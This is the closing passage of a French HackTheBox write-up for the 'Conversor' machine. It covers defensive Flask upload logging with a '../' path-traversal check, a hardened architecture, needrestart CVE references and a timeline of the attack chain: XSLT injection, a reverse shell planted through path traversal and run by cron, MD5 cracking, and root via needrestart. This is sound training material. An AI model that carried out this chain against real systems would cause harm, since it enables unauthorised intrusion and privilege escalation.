+</span></span><span style="display:flex;"><span>    logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Upload attempt - User: </span><span style="color:#e6db74">{</span>session[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">, &#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;XML: </span><span style="color:#e6db74">{</span>xml_file<span style="color:#f92672">.</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">, XSLT: </span><span style="color:#e6db74">{</span>xslt_file<span style="color:#f92672">.</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">, &#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;IP: </span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>remote_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Détecter les path traversal</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;../&#39;</span> <span style="color:#f92672">in</span> xml_file<span style="color:#f92672">.</span>filename <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;../&#39;</span> <span style="color:#f92672">in</span> xslt_file<span style="color:#f92672">.</span>filename:
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Path traversal attempt detected - &#34;</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;User: </span><span style="color:#e6db74">{</span>session[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">, &#34;</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Files: </span><span style="color:#e6db74">{</span>xml_file<span style="color:#f92672">.</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>xslt_file<span style="color:#f92672">.</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Invalid filename&#34;</span>, <span style="color:#ae81ff">400</span>
+</span></span></code></pre></div><h3 id="8-architecture-recommandée">8. Architecture Recommandée<a hidden class="anchor" aria-hidden="true" href="#8-architecture-recommandée">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌─────────────────────────────────────────────┐</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>          Reverse Proxy (Nginx)              <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">-</span> Rate Limiting                            <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">-</span> WAF Rules                                <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">-</span> HTTPS Enforcement                        <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─────────────────┬───────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌─────────────────▼───────────────────────────┐</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>      Web Application (Flask)                <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">-</span> <span style="color:#a6e22e">Input</span> Validation                         <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">-</span> Secure <span style="color:#a6e22e">File</span> Upload                       <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">-</span> Session Management                       <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─────────────────┬───────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌─────────────────▼───────────────────────────┐</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#a6e22e">File</span> Storage (Isolated)                <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">/</span>uploads<span style="color:#f92672">/</span>        <span style="color:#f92672">-</span> www<span style="color:#f92672">-</span>data:www<span style="color:#f92672">-</span>data (<span style="color:#ae81ff">770</span>) <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">/</span>scripts<span style="color:#f92672">/</span>        <span style="color:#f92672">-</span> root:root (<span style="color:#ae81ff">755</span>)         <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#f92672">/</span>processed<span style="color:#f92672">/</span>      <span style="color:#f92672">-</span> www<span style="color:#f92672">-</span>data:www<span style="color:#f92672">-</span>data (<span style="color:#ae81ff">750</span>) <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─────────────────────────────────────────────┘</span>
+</span></span></code></pre></div><hr>
+<h2 id="-références">📚 Références<a hidden class="anchor" aria-hidden="true" href="#-références">#</a></h2>
+<h3 id="cve-et-vulnérabilités">CVE et Vulnérabilités<a hidden class="anchor" aria-hidden="true" href="#cve-et-vulnérabilités">#</a></h3>
+<ul>
+<li>
+<p><strong>CVE-2024-48990</strong> - needrestart Local Privilege Escalation</p>
+<ul>
+<li>CVSS: 7.8 (High)</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48990">https://nvd.nist.gov/vuln/detail/CVE-2024-48990</a></li>
+</ul>
+</li>
+<li>
+<p><strong>CVE-2024-48991</strong> - needrestart Python Interpreter Hijacking</p>
+<ul>
+<li>CVSS: 7.8 (High)</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48991">https://nvd.nist.gov/vuln/detail/CVE-2024-48991</a></li>
+</ul>
+</li>
+<li>
+<p><strong>CVE-2024-10224</strong> - needrestart Additional Bypass</p>
+<ul>
+<li>CVSS: 7.8 (High)</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10224">https://nvd.nist.gov/vuln/detail/CVE-2024-10224</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="documentation-technique">Documentation Technique<a hidden class="anchor" aria-hidden="true" href="#documentation-technique">#</a></h3>
+<ul>
+<li>
+<p><strong>OWASP XSLT Injection</strong></p>
+<ul>
+<li><a href="https://owasp.org/www-community/attacks/XSLT_Injection">https://owasp.org/www-community/attacks/XSLT_Injection</a></li>
+</ul>
+</li>
+<li>
+<p><strong>CWE-91: XML Injection</strong></p>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/91.html">https://cwe.mitre.org/data/definitions/91.html</a></li>
+</ul>
+</li>
+<li>
+<p><strong>CWE-22: Path Traversal</strong></p>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/22.html">https://cwe.mitre.org/data/definitions/22.html</a></li>
+</ul>
+</li>
+<li>
+<p><strong>needrestart Documentation</strong></p>
+<ul>
+<li><a href="https://github.com/liske/needrestart">https://github.com/liske/needrestart</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="articles-et-writeups">Articles et Writeups<a hidden class="anchor" aria-hidden="true" href="#articles-et-writeups">#</a></h3>
+<ul>
+<li>
+<p><strong>Abusing sudo rights on needrestart for escalation</strong></p>
+<ul>
+<li><a href="https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f">https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f</a></li>
+</ul>
+</li>
+<li>
+<p><strong>XSLT Processing Security</strong></p>
+<ul>
+<li><a href="https://www.balisage.net/Proceedings/vol10/html/Lee01/BalisageVol10-Lee01.html">https://www.balisage.net/Proceedings/vol10/html/Lee01/BalisageVol10-Lee01.html</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Python Reverse Shell Cheat Sheet</strong></p>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="outils-utilisés">Outils utilisés<a hidden class="anchor" aria-hidden="true" href="#outils-utilisés">#</a></h3>
+<ul>
+<li><strong>nmap</strong> - Network scanning</li>
+<li><strong>Burp Suite</strong> - Web application security testing</li>
+<li><strong>hashcat</strong> - Password cracking</li>
+<li><strong>sqlite3</strong> - Database exploration</li>
+<li><strong>nc (netcat)</strong> - Reverse shell listener</li>
+<li><strong>python3</strong> - Exploitation scripts</li>
+</ul>
+<hr>
+<h2 id="-leçons-apprises">🎓 Leçons apprises<a hidden class="anchor" aria-hidden="true" href="#-leçons-apprises">#</a></h2>
+<h3 id="points-clés-de-cette-machine">Points clés de cette machine<a hidden class="anchor" aria-hidden="true" href="#points-clés-de-cette-machine">#</a></h3>
+<ol>
+<li><strong>Defense in Depth</strong> : Une seule vulnérabilité peut ne pas suffire, mais leur combinaison est dévastatrice</li>
+<li><strong>Code Review</strong> : L&rsquo;analyse du code source révèle souvent des vulnérabilités critiques</li>
+<li><strong>Configuration Files</strong> : Les fichiers de configuration et documentation peuvent révéler des informations critiques</li>
+<li><strong>Least Privilege</strong> : Les permissions sudo doivent être strictement limitées</li>
+<li><strong>Secure Parsing</strong> : Tous les parsers (XML, XSLT, JSON) doivent être correctement configurés</li>
+</ol>
+<h3 id="techniques-de-pentest-appliquées">Techniques de pentest appliquées<a hidden class="anchor" aria-hidden="true" href="#techniques-de-pentest-appliquées">#</a></h3>
+<ul>
+<li>✅ Source code review et analyse statique</li>
+<li>✅ XSLT injection et abuse de fonction document()</li>
+<li>✅ Path traversal pour bypass de restrictions</li>
+<li>✅ Timing-based exploitation (cron jobs)</li>
+<li>✅ Database enumeration et credential harvesting</li>
+<li>✅ Password cracking (MD5)</li>
+<li>✅ Sudo misconfiguration exploitation</li>
+<li>✅ Configuration file injection</li>
+</ul>
+<hr>
+<h2 id="-timeline-de-lexploitation">📊 Timeline de l&rsquo;exploitation<a hidden class="anchor" aria-hidden="true" href="#-timeline-de-lexploitation">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>m    : Scan nmap initial
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>m    : <span style="color:#960050;background-color:#1e0010">É</span>numération web et découverte du code source
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">15</span>m   : Identification des vulnérabilités XSLT <span style="color:#f92672">+</span> <span style="color:#a6e22e">Path</span> Traversal
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>m   : Test XSLT injection pour LFI
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span>m   : Upload du reverse shell via path traversal
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">26</span>m   : Réception du shell www<span style="color:#f92672">-</span>data (cron exec)
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span>m   : <span style="color:#960050;background-color:#1e0010">É</span>numération et extraction de la DB SQLite
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">35</span>m   : Cracking MD5 avec hashcat
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">37</span>m   : Pivot vers fismathack via SSH
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>m   : <span style="color:#960050;background-color:#1e0010">É</span>numération sudo, découverte de needrestart
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">45</span>m   : Recherche CVE et création du payload
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">47</span>m   : Root shell obtenu via needrestart <span style="color:#f92672">-</span>c
+</span></span><span style="display:flex;"><span>T<span style="color:#f92672">+</span><span style="color:#ae81ff">50</span>m   : Récupération des flags et nettoyage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total: <span style="color:#f92672">~</span><span style="color:#ae81ff">50</span> minutes
+</span></span></code></pre></div><hr>
+<h2 id="-conclusion">💭 Conclusion<a hidden class="anchor" aria-hidden="true" href="#-conclusion">#</a></h2>
+<p><strong>Conversor</strong> est une machine qui illustre parfaitement l&rsquo;importance de la <strong>chaîne d&rsquo;exploitation</strong> en pentest. Chaque vulnérabilité individuellement pourrait être contournée, mais leur combinaison crée un chemin d&rsquo;attaque complet :</p>
+<ol>
+<li><strong>XSLT Injection</strong> permet la reconnaissance</li>
+<li><strong>Path Traversal</strong> permet le positionnement du payload</li>
+<li><strong>Cron Job</strong> transforme l&rsquo;upload en RCE</li>
+<li><strong>Weak Hashing</strong> facilite le pivot utilisateur</li>
+<li><strong>Sudo Misconfiguration</strong> ouvre la porte au root</li>
+</ol>
+<p>Cette machine souligne également l&rsquo;importance de :</p>
+<ul>
+<li>La <strong>revue de code</strong> pour identifier les vulnérabilités</li>
+<li>La <strong>documentation système</strong> qui peut révéler des failles</li>
+<li>La <strong>configuration sécurisée</strong> de tous les composants</li>
+<li>Le <strong>principe du moindre privilège</strong> pour limiter l&rsquo;impact</li>
+</ul>
+<p>Un excellent exercice pour pratiquer l&rsquo;enchaînement de vulnérabilités et la post-exploitation !</p>
+<hr>
+<p><strong>Flags Captured</strong> : ✅ User | ✅ Root</p>
+<p><strong>Author</strong> : kz<br>
+<strong>Date</strong> : Décembre 2025<br>
+<strong>Platform</strong> : HackTheBox<br>
+<strong>Difficulty</strong> : Medium ⭐⭐⭐</p>
+<hr>
+<p><em>Ce writeup est publié à des fins éducatives uniquement. N&rsquo;utilisez ces techniques que sur des systèmes pour lesquels vous avez une autorisation explicite.</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/easy/">Easy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/cicada/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Cicada - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/escapetwo/">
+    <span class="title">Next »</span>
+    <br>
+    <span>EscapeTwo - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
